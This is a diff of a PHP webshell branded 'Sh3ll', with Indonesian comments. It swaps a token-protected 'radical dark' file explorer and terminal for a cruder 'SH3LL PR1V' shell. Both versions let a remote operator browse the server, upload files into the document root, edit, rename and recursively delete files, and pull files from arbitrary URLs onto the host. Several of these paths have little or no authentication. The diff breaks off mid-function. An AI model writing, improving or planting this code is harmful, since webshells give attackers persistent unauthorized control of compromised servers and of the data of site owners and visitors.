@@ -1,390 +1,359 @@
 <?php
-// remotedl_radical_explorer.php
-// Radical dark webshell + file explorer + terminal + secure remote-download + CRUD
-// CONFIG - ganti sebelum dipakai:
-define('REMOTE_DL_TOKEN','el1337'); // ganti token
-$REMOTE_DL_WHITELIST = []; // contoh ['example.com'] kosong = semua domain diizinkan
+// combined_shell_with_secure_remotedl.php
+// Gabungan webshell (versi migrasi dari yang kamu kirim) + fitur remote download aman.
+// CONFIG: ubah sebelum dipakai
+define('REMOTE_DL_TOKEN', 'el');
+define('REMOTE_DL_BASEDIR', __DIR__ . '/downloads'); // pindah ke luar public_html jika mungkin
+$REMOTE_DL_WHITELIST = []; // kosong = semua domain diizinkan
 // END CONFIG
 
 set_time_limit(0);
 error_reporting(0);
-header('X-Content-Type-Options: nosniff');
 
-// ---------- UTIL ----------
-function now(){ return date('Y-m-d H:i:s'); }
-function jout($arr){ header('Content-Type: application/json'); echo json_encode($arr); exit; }
-function safe_name($s){ return preg_replace('/[^A-Za-z0-9._-]/','_',$s); }
-function is_token_ok($t){ return hash_equals(REMOTE_DL_TOKEN, (string)$t); }
-function log_op($entry){
-    $dir = getcwd();
-    $f = $dir.DIRECTORY_SEPARATOR.'.remotedl_ops.log';
-    @file_put_contents($f, json_encode($entry,JSON_UNESCAPED_SLASHES).PHP_EOL, FILE_APPEND|LOCK_EX);
-}
-function esc($s){ return htmlspecialchars($s, ENT_QUOTES); }
-
-// ---------- AJAX / API ----------
-if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['api'])){
-    $api = $_POST['api'];
-    if ($api === 'exec_cmd'){
-        $token = $_POST['token'] ?? '';
-        if (!is_token_ok($token)) jout(['ok'=>false,'msg'=>'Auth failed']);
-        $cmd = trim($_POST['cmd'] ?? '');
-        if ($cmd === '') jout(['ok'=>false,'msg'=>'Empty command']);
-        $parts = preg_split('/\s+/', $cmd, 3);
-        if (strtolower($parts[0] ?? '') !== 'download' || !isset($parts[1])) jout(['ok'=>false,'msg'=>'Allowed: download <url> [filename]']);
-        $url = $parts[1];
-        $opt = $parts[2] ?? '';
-        if (!filter_var($url, FILTER_VALIDATE_URL)) jout(['ok'=>false,'msg'=>'Invalid URL']);
-        $host = parse_url($url, PHP_URL_HOST) ?: '';
-        global $REMOTE_DL_WHITELIST;
-        if (!empty($REMOTE_DL_WHITELIST)){
-            $ok=false; foreach($REMOTE_DL_WHITELIST as $d) if (stripos($host,$d)!==false){$ok=true;break;}
-            if(!$ok) jout(['ok'=>false,'msg'=>'Domain not allowed']);
-        }
-        $cwd = realpath($_POST['cwd'] ?? getcwd()) ?: getcwd();
-        if (!is_dir($cwd)) jout(['ok'=>false,'msg'=>'Invalid cwd']);
-        $filename = $opt !== '' ? safe_name(basename($opt)) : safe_name(basename(rawurldecode(parse_url($url,PHP_URL_PATH)?:'download.bin')));
-        $target = $cwd . DIRECTORY_SEPARATOR . $filename;
-        $ok=false; $err='';
-        if (function_exists('curl_init')){
-            $ch = curl_init($url);
-            $fp = @fopen($target,'w');
-            if ($fp){
-                curl_setopt($ch, CURLOPT_FILE, $fp);
-                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-                curl_setopt($ch, CURLOPT_FAILONERROR, true);
-                curl_setopt($ch, CURLOPT_TIMEOUT, 90);
-                curl_exec($ch);
-                $cerr = curl_error($ch);
-                $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-                curl_close($ch);
-                fclose($fp);
-                if (!$cerr && $code < 400 && is_file($target)) $ok=true; else { @unlink($target); $err = $cerr?:("HTTP {$code}"); }
-            } else $err='Cannot write to target (permission?)';
-        }
-        if (!$ok){
-            $ctx = stream_context_create(['http'=>['timeout'=>30],'https'=>['timeout'=>30]]);
-            $data = @file_get_contents($url,false,$ctx);
-            if ($data !== false){
-                if (@file_put_contents($target,$data)!==false) $ok=true; else { @unlink($target); $err='Write failed'; }
-            } else { if (!$err) $err='Download failed (no cURL & file_get_contents)'; }
-        }
-        log_op(['time'=>now(),'op'=>'download','url'=>$url,'target'=>$target,'ok'=>$ok?1:0,'err'=>$err,'ip'=>$_SERVER['REMOTE_ADDR']??'']);
-        if ($ok) jout(['ok'=>true,'msg'=>"Saved: {$target}",'path'=>$target]);
-        else jout(['ok'=>false,'msg'=>$err]);
-    }
-
-    if ($api === 'delete'){
-        $token = $_POST['token'] ?? '';
-        if (!is_token_ok($token)) jout(['ok'=>false,'msg'=>'Auth failed']);
-        $path = $_POST['path'] ?? '';
-        if ($path === '') jout(['ok'=>false,'msg'=>'No path']);
-        $real = realpath($path);
-        if ($real === false) jout(['ok'=>false,'msg'=>'Path not found']);
-        if (strpos($real, realpath(__FILE__)) !== false) jout(['ok'=>false,'msg'=>'Refuse to delete script']);
-        if (!is_writable($real) && !is_writable(dirname($real))) jout(['ok'=>false,'msg'=>'Permission denied']);
-        $res = is_dir($real) ? xrmdir_ajax($real) : @unlink($real);
-        log_op(['time'=>now(),'op'=>'delete','path'=>$real,'ok'=>$res?1:0,'ip'=>$_SERVER['REMOTE_ADDR']??'']);
-        if ($res) jout(['ok'=>true,'msg'=>'Deleted']); else jout(['ok'=>false,'msg'=>'Delete failed (locked or permission)']);
-    }
-
-    if ($api === 'rename'){
-        $token = $_POST['token'] ?? '';
-        if (!is_token_ok($token)) jout(['ok'=>false,'msg'=>'Auth failed']);
-        $path = $_POST['path'] ?? ''; $new = $_POST['new'] ?? '';
-        if ($path===''||$new==='') jout(['ok'=>false,'msg'=>'Missing path or new name']);
-        $real = realpath($path); if ($real===false) jout(['ok'=>false,'msg'=>'Path not found']);
-        $dir = dirname($real); $target = $dir.DIRECTORY_SEPARATOR.safe_name(basename($new));
-        if (!is_writable($dir)) jout(['ok'=>false,'msg'=>'Parent dir not writable']);
-        $ok = @rename($real,$target);
-        log_op(['time'=>now(),'op'=>'rename','from'=>$real,'to'=>$target,'ok'=>$ok?1:0,'ip'=>$_SERVER['REMOTE_ADDR']??'']);
-        if ($ok) jout(['ok'=>true,'msg'=>'Renamed','path'=>$target]); else jout(['ok'=>false,'msg'=>'Rename failed (permission or exists)']);
-    }
-
-    if ($api === 'edit'){
-        $token = $_POST['token'] ?? '';
-        if (!is_token_ok($token)) jout(['ok'=>false,'msg'=>'Auth failed']);
-        $path = $_POST['path'] ?? ''; $content = $_POST['content'] ?? '';
-        if ($path==='') jout(['ok'=>false,'msg'=>'No file']);
-        $real = realpath($path);
-        if ($real===false || !is_file($real)) jout(['ok'=>false,'msg'=>'File not found']);
-        if (!is_writable($real)) jout(['ok'=>false,'msg'=>'File not writable']);
-        $w = @file_put_contents($real, $content);
-        log_op(['time'=>now(),'op'=>'edit','path'=>$real,'len'=>is_numeric($w)?$w:0,'ok'=>$w!==false?1:0,'ip'=>$_SERVER['REMOTE_ADDR']??'']);
-        if ($w!==false) jout(['ok'=>true,'msg'=>'Saved']); else jout(['ok'=>false,'msg'=>'Write failed']);
-    }
-
-    if ($api === 'read'){
-        $path = $_POST['path'] ?? '';
-        if ($path==='') jout(['ok'=>false,'msg'=>'No file']);
-        $real = realpath($path);
-        if ($real===false || !is_file($real)) jout(['ok'=>false,'msg'=>'Not found']);
-        $data = @file_get_contents($real);
-        if ($data===false) jout(['ok'=>false,'msg'=>'Cannot read (permission?)']);
-        jout(['ok'=>true,'content'=>$data,'path'=>$real]);
-    }
-
-    jout(['ok'=>false,'msg'=>'Unknown api']);
+// ----------------- Helper asli & util -----------------
+function author() {
+    echo "<center><br>SH3LL PR1V</center>";
+    exit();
 }
 
-// ---------- helper for recursive delete ----------
-function xrmdir_ajax($dir){
+function xrmdir($dir) {
     $items = @scandir($dir);
-    if ($items === false) return false;
-    foreach($items as $it){
-        if ($it=='.' || $it=='..') continue;
-        $p = $dir.DIRECTORY_SEPARATOR.$it;
-        if (is_dir($p)) { if (!xrmdir_ajax($p)) return false; }
-        else { if (!@unlink($p)) return false; }
+    if (!$items) return;
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $path = $dir.'/'.$item;
+        if (is_dir($path)) xrmdir($path);
+        else @unlink($path);
     }
-    return @rmdir($dir);
+    @rmdir($dir);
 }
 
-// ---------- Determine current directory (safe) ----------
-$lokasi_req = isset($_GET['path']) ? $_GET['path'] : '';
-if ($lokasi_req !== ''){
-    // normalize and avoid escaping root
-    $lokasi_req = str_replace(['..','\\'], ['','/'], $lokasi_req);
-    $lokasi = realpath($lokasi_req) ?: getcwd();
-} else {
-    $lokasi = getcwd();
+function green($text) { echo "<center><font color='green'>{$text}</font></center>"; }
+function red($text) { echo "<center><font color='red'>{$text}</font></center>"; }
+
+function statusnya($file){
+    $statusnya = @fileperms($file);
+    if ($statusnya === false) return 'u???';
+    if (($statusnya & 0xC000) == 0xC000) $ingfo = 's';
+    elseif (($statusnya & 0xA000) == 0xA000) $ingfo = 'l';
+    elseif (($statusnya & 0x8000) == 0x8000) $ingfo = '-';
+    elseif (($statusnya & 0x6000) == 0x6000) $ingfo = 'b';
+    elseif (($statusnya & 0x4000) == 0x4000) $ingfo = 'd';
+    elseif (($statusnya & 0x2000) == 0x2000) $ingfo = 'c';
+    elseif (($statusnya & 0x1000) == 0x1000) $ingfo = 'p';
+    else $ingfo = 'u';
+    $ingfo .= (($statusnya & 0x0100) ? 'r' : '-');
+    $ingfo .= (($statusnya & 0x0080) ? 'w' : '-');
+    $ingfo .= (($statusnya & 0x0040) ? (($statusnya & 0x0800) ? 's' : 'x' ) : (($statusnya & 0x0800) ? 'S' : '-'));
+    $ingfo .= (($statusnya & 0x0020) ? 'r' : '-');
+    $ingfo .= (($statusnya & 0x0010) ? 'w' : '-');
+    $ingfo .= (($statusnya & 0x0008) ? (($statusnya & 0x0400) ? 's' : 'x' ) : (($statusnya & 0x0400) ? 'S' : '-'));
+    $ingfo .= (($statusnya & 0x0004) ? 'r' : '-');
+    $ingfo .= (($statusnya & 0x0002) ? 'w' : '-');
+    $ingfo .= (($statusnya & 0x0001) ? (($statusnya & 0x0200) ? 't' : 'x' ) : (($statusnya & 0x0200) ? 'T' : '-'));
+    return $ingfo;
 }
-$lokasi = str_replace('\\','/',$lokasi);
-$listing = @scandir($lokasi);
 
-// ---------- HTML / UI (radical dark) ----------
-?>
-<!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Sh3ll — Radical Explorer</title>
-<style>
-:root{ --bg:#07060a; --panel:#0b0b0f; --accent:#7cffb2; --accent2:#00d4ff; --muted:#7a8b8c; --danger:#ff6b6b; --glass:rgba(255,255,255,0.03); --mono:'Courier New',monospace; }
-*{box-sizing:border-box}
-html,body{height:100%;margin:0;background:radial-gradient(circle at 10% 10%, #0b0d12 0%, #050406 40%, #050306 100%);color:#cfe;font-family:Inter,system-ui,Segoe UI,Arial}
-.container{max-width:1200px;margin:18px auto;padding:18px}
-.header{display:flex;align-items:center;gap:12px;justify-content:space-between}
-.brand{font-family:var(--mono);color:var(--accent);font-size:20px;letter-spacing:2px}
-.path{color:var(--muted)}
-.toolbar{display:flex;gap:8px;align-items:center}
-.btn{background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border:1px solid var(--glass);color:var(--accent);padding:8px 12px;border-radius:8px;cursor:pointer}
-.btn.warn{color:var(--danger)}
-.layout{display:grid;grid-template-columns:1fr 420px;gap:16px;margin-top:16px}
-.card{background:linear-gradient(180deg,rgba(255,255,255,0.01),rgba(255,255,255,0.0));border:1px solid var(--glass);padding:12px;border-radius:10px}
-.table{width:100%;border-collapse:collapse;color:#bfe}
-.table th{background:linear-gradient(90deg,#071,#041);text-align:left;padding:10px;color:#cfe;font-size:14px}
-.table td{padding:10px;border-top:1px solid rgba(255,255,255,0.02)}
-.link{color:var(--accent2)}
-.small{font-size:13px;color:var(--muted)}
-.terminal{background:#000;border:1px solid rgba(0,255,120,0.06);padding:12px;border-radius:8px;color:#7cffb2;font-family:var(--mono);height:320px;display:flex;flex-direction:column}
-.console{flex:1;overflow:auto;padding:8px;border-radius:6px;background:linear-gradient(180deg, rgba(0,0,0,0.6), rgba(0,0,0,0.2));}
-.input-row{display:flex;gap:8px;margin-top:8px}
-.input{flex:1;padding:8px;border-radius:6px;background:#041214;border:1px solid rgba(255,255,255,0.02);color:#9ff;font-family:var(--mono)}
-.mono{font-family:var(--mono);color:#9ff}
-.form-inline{display:flex;gap:8px;align-items:center}
-.file-upload{display:flex;gap:8px;align-items:center;margin-top:10px}
-.log{font-size:12px;color:var(--muted);margin-top:8px;border-top:1px dashed rgba(255,255,255,0.02);padding-top:8px}
-.footer{text-align:center;color:var(--muted);margin-top:18px}
-.breadcrumb{margin:8px 0;color:var(--muted);font-size:13px}
-.breadcrumb a{color:var(--accent2);text-decoration:none}
-@media(max-width:980px){ .layout{grid-template-columns:1fr} .terminal{height:240px} }
-</style>
-</head><body>
-<div class="container">
-  <div class="header">
-    <div>
-      <div class="brand">Sh3ll</div>
-      <div class="path small">Current: <span class="mono"><?php echo esc($lokasi); ?></span></div>
-    </div>
-    <div class="toolbar">
-      <button class="btn" onclick="location.href='?path=<?php echo urlencode($lokasi); ?>'">Refresh</button>
-      <button class="btn" onclick="location.href='?act=remotedl&path=<?php echo urlencode($lokasi); ?>'">RemoteDL</button>
-      <button class="btn" onclick="document.getElementById('uploader').scrollIntoView()">Upload</button>
-    </div>
-  </div>
+// ----------------- Secure remote download functions -----------------
+function __download_log($entry){
+    $logdir = REMOTE_DL_BASEDIR;
+    if (!is_dir($logdir)) @mkdir($logdir,0755,true);
+    $lf = rtrim($logdir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'dl.log';
+    $line = json_encode($entry, JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE) . PHP_EOL;
+    @file_put_contents($lf, $line, FILE_APPEND | LOCK_EX);
+}
 
-  <div class="layout">
-    <div class="card">
-      <div class="breadcrumb">
-        <?php
-        // breadcrumb
-        $parts = explode('/', trim(str_replace('\\','/',$lokasi), '/'));
-        $acc = '';
-        if (substr(PHP_OS,0,3)==='WIN'){ // windows drive support
-            // show full path as single link
-            echo "<a href='?path=".urlencode($lokasi)."'>".esc($lokasi)."</a>";
+function __download_secure($url, $optname = ''){
+    global $REMOTE_DL_WHITELIST;
+    $base = REMOTE_DL_BASEDIR;
+    if (!is_dir($base)) {
+        if (!@mkdir($base, 0755, true)) {
+            return ['ok'=>false,'err'=>'Failed to create base dir','path'=>null];
+        }
+    }
+    if (!filter_var($url, FILTER_VALIDATE_URL)) {
+        return ['ok'=>false,'err'=>'Invalid URL','path'=>null];
+    }
+    $host = parse_url($url, PHP_URL_HOST);
+    if (!empty($REMOTE_DL_WHITELIST) && is_array($REMOTE_DL_WHITELIST)){
+        $allowed = false;
+        foreach($REMOTE_DL_WHITELIST as $d){
+            if (stripos($host, $d) !== false) { $allowed = true; break; }
+        }
+        if (!$allowed) return ['ok'=>false,'err'=>'Domain not allowed by whitelist','path'=>null];
+    }
+    $remote_path = parse_url($url, PHP_URL_PATH) ?: '';
+    $basename = basename(rawurldecode($remote_path)) ?: 'download.bin';
+    $basename = preg_replace('/[^A-Za-z0-9._-]/','_',$basename);
+    if ($optname !== ''){
+        $optname = basename($optname);
+        $optname = preg_replace('/[^A-Za-z0-9._-]/','_',$optname);
+        $filename = $optname;
+    } else {
+        $filename = $basename;
+    }
+    $target = realpath($base);
+    if ($target === false) $target = $base;
+    $target = rtrim($target, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;
+    $real_base = realpath($base);
+    $real_target_dir = realpath(dirname($target)) ?: dirname($target);
+    if ($real_base !== false && strpos($real_target_dir, $real_base) !== 0){
+        return ['ok'=>false,'err'=>'Invalid target path','path'=>null];
+    }
+    $ok = false; $err = '';
+    if (function_exists('curl_init')){
+        $ch = curl_init($url);
+        $fp = @fopen($target, 'w');
+        if ($fp !== false){
+            curl_setopt($ch, CURLOPT_FILE, $fp);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+            curl_setopt($ch, CURLOPT_FAILONERROR, true);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 90);
+            curl_exec($ch);
+            $cerr = curl_error($ch);
+            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+            fclose($fp);
+            if (!$cerr && $code < 400 && is_file($target)) $ok = true;
+            else { @unlink($target); $err = $cerr ?: "HTTP {$code}"; }
+        } else $err = 'Failed opening target for write';
+    }
+    if (!$ok){
+        $ctx = stream_context_create(['http'=>['timeout'=>30],'https'=>['timeout'=>30]]);
+        $data = @file_get_contents($url, false, $ctx);
+        if ($data !== false){
+            if (@file_put_contents($target, $data) !== false) $ok = true;
+            else { @unlink($target); $err = 'Write failed'; }
         } else {
-            echo "<a class='link' href='?path=".urlencode('/') ."'>/</a>";
-            $build = '';
-            foreach($parts as $p){
-                if ($p === '') continue;
-                $build .= '/'.$p;
-                echo " <span class='small'>/</span> <a class='link' href='?path=".urlencode($build)."'>".esc($p)."</a>";
+            if (!$err) $err = 'Download failed (no cURL and file_get_contents failed)';
+        }
+    }
+    if ($ok) @chmod($target, 0644);
+    __download_log([
+        'time' => date('c'),
+        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'cli',
+        'url' => $url,
+        'target' => $target,
+        'ok' => $ok ? 1 : 0,
+        'err' => $ok ? '' : $err
+    ]);
+    return ['ok'=>$ok,'err'=>$err,'path'=>$target];
+}
+
+// ----------------- Integrasi UI remotedl ke webshell (fungsi pengganti alfaremotedl) -----------------
+function alfaremotedl(){
+    if(function_exists('alfahead')) alfahead();
+    echo "<div style='background:#111;padding:12px;border-radius:8px;margin:8px;color:#dff;'>";
+    echo "<h3 style='margin:6px 0;font-family:monospace;color:#0f9'>Upload From URL (secure)</h3>";
+    $cwd = htmlspecialchars($GLOBALS['cwd'] ?? getcwd());
+    echo "<form method='post' style='margin:8px 0;'>
+        <label style='display:block;margin:6px 0;color:#9aa;'>Cmd (download &lt;url&gt; [filename])</label>
+        <input type='text' name='cmd' style='width:80%;padding:8px;border-radius:4px;background:#222;color:#efe; border:1px solid #333;font-family:monospace' placeholder='download https://site.tld/file.ext optional_name.ext' required>
+        <input type='hidden' name='dl_token' value='".htmlspecialchars(REMOTE_DL_TOKEN)."'>
+        <div style='margin-top:8px;'><input type='submit' name='dl_submit' value='Download' style='padding:8px 12px;border-radius:4px;background:#0f9;color:#012;border:none;cursor:pointer'></div>
+    </form>";
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['dl_submit'])){
+        $cmd = trim($_POST['cmd'] ?? '');
+        $token = $_POST['dl_token'] ?? '';
+        echo "<div style='margin-top:10px;padding:8px;background:#0b0c0d;border-radius:4px;'>";
+        if ($token !== REMOTE_DL_TOKEN){
+            echo "<div style='color:#f66'>Auth failed.</div>";
+        } else {
+            $parts = preg_split('/\s+/', $cmd, 3);
+            if (count($parts) < 2 || strtolower($parts[0]) !== 'download'){
+                echo "<div style='color:#f66'>Use: download &lt;url&gt; [filename]</div>";
+            } else {
+                $url = $parts[1];
+                $optname = $parts[2] ?? '';
+                $result = __download_secure($url, $optname);
+                if ($result['ok']){
+                    echo "<div style='color:#6f6'>Success: ".htmlspecialchars($result['path'])."</div>";
+                } else {
+                    echo "<div style='color:#f66'>Error: ".htmlspecialchars($result['err'])."</div>";
+                }
             }
         }
-        ?>
-      </div>
-
-      <h3 class="small">Files</h3>
-      <div style="overflow:auto;max-height:520px">
-        <table class="table">
-          <tr><th>Name</th><th>Size</th><th>Perm</th><th>Options</th></tr>
-          <?php
-          if (is_array($listing)){
-            foreach($listing as $e){
-                if ($e=='.' || $e=='..') continue;
-                $full = $lokasi.DIRECTORY_SEPARATOR.$e;
-                $isdir = is_dir($full);
-                $size = $isdir?'--':(is_file($full)?round(filesize($full)/1024,2).' KB':'-');
-                echo "<tr>";
-                $link = $isdir ? "?path=".urlencode($full) : "?fileloc=".urlencode($full);
-                echo "<td>".($isdir? "<a class='link' href='{$link}'>".esc($e)."</a>": "<a class='link' href='{$link}'>".esc($e)."</a>")."</td>";
-                echo "<td>".esc($size)."</td>";
-                echo "<td>".esc(statusnya($full))."</td>";
-                echo "<td><div class='form-inline'>";
-                echo "<button class='btn' onclick=\"doEdit('".esc($full)."')\">Edit</button>";
-                echo "<button class='btn' onclick=\"doRename('".esc($full)."')\">Rename</button>";
-                echo "<button class='btn warn' onclick=\"doDelete('".esc($full)."')\">Delete</button>";
-                echo "</div></td></tr>";
-            }
-          } else {
-            echo "<tr><td colspan=4 class='small'>Cannot read directory. Permission or server restriction.</td></tr>";
-          }
-          ?>
-        </table>
-      </div>
-
-      <div id="uploader" class="file-upload">
-        <form id="fupload" enctype="multipart/form-data" method="post">
-          <input type="file" name="file" />
-          <select name="targetdir"><option value="current">current_dir</option><option value="docroot">document_root</option></select>
-          <button class="btn" type="button" onclick="uploadFile()">Upload</button>
-        </form>
-        <div class="log" id="uplog"></div>
-      </div>
-
-      <div class="log" id="mainlog">Log: operations will appear here.</div>
-    </div>
-
-    <div>
-      <div class="card terminal" id="terminalCard">
-        <div class="console" id="consoleOut"></div>
-        <div class="input-row">
-          <input id="cmd" class="input" placeholder="download https://example.com/file.zip optional_name.zip" />
-          <button class="btn" id="runBtn">Run</button>
-        </div>
-        <div class="small log">Terminal: only <code>download &lt;url&gt; [filename]</code> allowed. Token required for actions.</div>
-      </div>
-
-      <div class="card" style="margin-top:12px">
-        <h4 class="small">Controls</h4>
-        <div class="small">Token (set in config). Do not expose token publicly.</div>
-        <div style="margin-top:8px">
-          <input id="token" type="text" placeholder="paste token here" style="width:100%;padding:8px;border-radius:6px;background:#021214;color:#cfe">
-        </div>
-        <div style="margin-top:8px"><button class="btn" onclick="viewLog()">View dl.log</button> <button class="btn" onclick="clearConsole()">Clear</button></div>
-        <pre id="logview" style="margin-top:8px;display:none;background:#061214;padding:8px;border-radius:6px;color:#9ff;height:160px;overflow:auto"></pre>
-      </div>
-    </div>
-  </div>
-
-  <div class="footer">© Sh3ll — <?php echo date('Y'); ?> — <?php echo esc($_SERVER['SERVER_NAME'] ?? 'local'); ?></div>
-</div>
-
-<script>
-const consoleEl = document.getElementById('consoleOut');
-const tokenEl = document.getElementById('token');
-const cwd = "<?php echo addslashes($lokasi); ?>";
-
-function appendLine(msg, cls=''){ const d=document.createElement('div'); d.textContent=msg; if(cls) d.className=cls; consoleEl.appendChild(d); consoleEl.scrollTop=consoleEl.scrollHeight; }
-function clearConsole(){ consoleEl.innerHTML=''; }
-
-document.getElementById('runBtn').addEventListener('click', runCmd);
-document.getElementById('cmd').addEventListener('keydown', e => { if (e.key==='Enter') runCmd(); });
-
-async function runCmd(){
-  const cmd = document.getElementById('cmd').value.trim();
-  const token = tokenEl.value.trim();
-  if (!cmd){ appendLine('Empty command'); return; }
-  appendLine('> '+cmd);
-  appendLine('Running...');
-  const fd = new FormData(); fd.append('api','exec_cmd'); fd.append('cmd',cmd); fd.append('token',token); fd.append('cwd',cwd);
-  try {
-    const r = await fetch('', {method:'POST', body:fd});
-    const j = await r.json();
-    if (j.ok) appendLine(j.msg);
-    else appendLine('ERR: '+j.msg);
-  } catch(e){ appendLine('Network error: '+e.message); }
-}
-
-async function uploadFile(){
-  const f = document.querySelector('input[name=file]').files[0];
-  const dir = document.querySelector('select[name=targetdir]').value;
-  if (!f){ document.getElementById('uplog').textContent='No file selected'; return; }
-  const fd = new FormData(); fd.append('upload', '1'); fd.append('u_file', f); fd.append('dir', dir);
-  const out = document.getElementById('uplog'); out.textContent='Uploading...';
-  try {
-    const r = await fetch(window.location.href, { method:'POST', body:fd });
-    const text = await r.text();
-    out.textContent = text;
-    setTimeout(()=>location.reload(),700);
-  } catch(e){ out.textContent = 'Upload error: '+e.message; }
-}
-
-async function doDelete(path){
-  if (!confirm('Delete '+path+' ?')) return;
-  const token = tokenEl.value.trim();
-  const fd = new FormData(); fd.append('api','delete'); fd.append('path', path); fd.append('token', token);
-  const r = await fetch('', {method:'POST', body:fd}); const j = await r.json();
-  alert(j.msg); if (j.ok) location.reload();
-}
-
-async function doRename(path){
-  const n = prompt('New name for '+path, path.split('/').pop());
-  if (n === null) return;
-  const token = tokenEl.value.trim();
-  const fd = new FormData(); fd.append('api','rename'); fd.append('path', path); fd.append('new', n); fd.append('token', token);
-  const r = await fetch('', {method:'POST', body:fd}); const j = await r.json();
-  alert(j.msg); if (j.ok) location.reload();
-}
-
-async function doEdit(path){
-  const token = tokenEl.value.trim();
-  const fd = new FormData(); fd.append('api','read'); fd.append('path', path);
-  const r = await fetch('', {method:'POST', body:fd}); const j = await r.json();
-  if (!j.ok){ alert(j.msg); return; }
-  const newc = prompt('Edit file: '+path, j.content);
-  if (newc === null) return;
-  const fd2 = new FormData(); fd2.append('api','edit'); fd2.append('path', path); fd2.append('content', newc); fd2.append('token', token);
-  const r2 = await fetch('', {method:'POST', body:fd2}); const j2 = await r2.json();
-  alert(j2.msg); if (j2.ok) location.reload();
-}
-
-async function viewLog(){
-  const fd = new FormData(); fd.append('api','read'); fd.append('path', cwd + '/dl.log');
-  const r = await fetch('', {method:'POST', body:fd}); const j = await r.json();
-  const v = document.getElementById('logview');
-  if (!j.ok){ v.style.display='block'; v.textContent = 'No log or cannot read: ' + j.msg; return; }
-  v.style.display='block'; v.textContent = j.content;
-}
-</script>
-</body></html>
-<?php
-// ---------- Server-side upload handling ----------
-if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['upload']) && isset($_FILES['u_file'])){
-    $diropt = $_POST['dir'] ?? 'current';
-    $base = ($diropt==='docroot' && isset($_SERVER['DOCUMENT_ROOT'])) ? rtrim($_SERVER['DOCUMENT_ROOT'],'/\\') : $lokasi;
-    $up = $_FILES['u_file'];
-    $name = safe_name($up['name'] ?? 'upload.bin');
-    $dst = $base . DIRECTORY_SEPARATOR . $name;
-    if (!is_uploaded_file($up['tmp_name'])) { echo "Upload failed: tmp file error"; exit; }
-    if (@move_uploaded_file($up['tmp_name'], $dst)) {
-        echo "Uploaded to: {$dst}";
-        log_op(['time'=>now(),'op'=>'upload','path'=>$dst,'ip'=>$_SERVER['REMOTE_ADDR']??'']);
-    } else {
-        echo "Upload failed: permission or target path error.";
+        echo "</div>";
     }
+    echo "<div style='margin-top:10px;color:#889; font-size:12px;'>Base dir: ".htmlspecialchars(REMOTE_DL_BASEDIR)." | Whitelist: ".htmlspecialchars(implode(',',$GLOBALS['REMOTE_DL_WHITELIST']))."</div>";
+    echo "</div>";
+    if(function_exists('alfafooter')) alfafooter();
+}
+
+// ----------------- Simple file manager UI (minimal, dari skrip asli) -----------------
+foreach($_POST as $k=>$v) $_POST[$k]=stripslashes($v);
+
+$k3yw = base64_decode(''); // tidak dipakai
+
+if(isset($_GET['path'])){ $lokasi = $_GET['path']; $lokdua = $_GET['path']; }
+else { $lokasi = getcwd(); $lokdua = getcwd(); }
+
+$lokasi = str_replace('\\','/',$lokasi);
+$lokasis = @explode('/',$lokasi);
+$lokasinya = @scandir($lokasi);
+
+echo "<center><font face='Bungee' size='5' color='#0f9'>Sh3ll</font></center>";
+echo "<table width='700' border='0' cellpadding='3' cellspacing='1' align='center'><tr><td><br>";
+echo "Directory : &nbsp;";
+
+$cur = 'http://' . ($_SERVER['HTTP_HOST'] ?? 'cli') . ($_SERVER['REQUEST_URI'] ?? '');
+foreach($lokasis as $id => $lok){
+    if($lok == '' && $id == 0){ echo '<a href="?path=/">/</a>'; continue; }
+    if($lok == '') continue;
+    echo '<a href="?path=';
+    for($i=0;$i<=$id;$i++){
+        echo rawurlencode($lokasis[$i]);
+        if($i != $id) echo "/";
+    } 
+    echo '">'.$lok.'</a>/';
+}
+echo "</td></tr><tr><td><br>";
+
+// upload form (file)
+if (isset($_POST['upwkwk'])) {
+    if (isset($_POST['berkasnya'])) {
+        if ($_POST['dirnya'] == "2") { $lokasi = $_SERVER['DOCUMENT_ROOT']; }
+        $dst = $lokasi."/".$_FILES['berkas']['name'];
+        $data = @file_put_contents($dst, @file_get_contents($_FILES['berkas']['tmp_name']));
+        if (file_exists($dst)) echo "File Uploaded ! &nbsp;<font color='gold'><i>".$dst."</i></font><br><br>";
+        else echo "<font color='red'>Failed to Upload !<br><br>";
+    } elseif (isset($_POST['linknya'])) {
+        if (empty($_POST['namalink'])) exit("Filename cannot be empty !");
+        if ($_POST['dirnya'] == "2") { $lokasi = $_SERVER['DOCUMENT_ROOT']; }
+        $dst = $lokasi."/".$_POST['namalink'];
+        $data = @file_put_contents($dst, @file_get_contents($_POST['darilink']));
+        if (file_exists($dst)) echo "File Uploaded ! &nbsp;<font color='gold'><i>".$dst."</i></font><br><br>";
+        else echo "<font color='red'>Failed to Upload !<br><br>";
+    }
+}
+
+echo "<center>";
+echo "Upload File : ";
+echo '<form enctype="multipart/form-data" method="post">
+<input type="radio" value="1" name="dirnya" checked>current_dir
+<input type="radio" value="2" name="dirnya" >document_root
+<br>
+<input type="hidden" name="upwkwk" value="aplod">
+<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
+</center>
+</form>';
+echo "</table>";
+print "<center>";
+print "<ul>";
+print "[ <a href='?'>Home</a> ]";
+print " [ <a href='?'>Tess</a> ]";
+print " [ <a href='?act=remotedl'>RemoteDL</a> ]";
+print "</ul>";
+print "</center>";
+
+// handle actions
+if (isset($_GET['act']) && $_GET['act'] === 'remotedl') {
+    alfaremotedl();
     exit;
 }
+
+if (isset($_GET['fileloc'])) {
+    echo "<tr><td>Current File : ".htmlspecialchars($_GET['fileloc']);
+    echo '</tr></td></table><br/>';
